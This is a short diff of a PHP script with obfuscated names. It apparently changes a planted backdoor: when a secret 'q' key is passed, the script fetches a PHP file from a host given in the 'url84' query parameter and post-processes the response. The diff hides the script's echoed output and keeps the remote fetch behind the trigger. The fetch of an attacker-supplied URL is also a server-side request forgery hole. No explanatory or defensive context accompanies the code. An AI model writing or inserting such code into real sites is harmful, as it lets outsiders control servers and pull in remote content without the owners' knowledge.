@@ -1,14 +1,8 @@
 <?php
 
-$linux84741274 = $_GET['url84'];
-
 if($_GET["q"] == "")
   
 {
-
-echo "linux8474";
-
-echo "$linux84741274";
 
 }
 
@@ -16,10 +10,8 @@ if($_GET["q"] == "linux8474")
   
 {
 
-echo "linux84";
+$linux84741274 = $_GET['url84'];
 
-echo "$linux84741274";
-  
 $google8474 = file_get_contents("$linux84741274/linux8474.php?q=linux8474");
 
 $google8474 = preg_replace("/mine/","",$google8474);
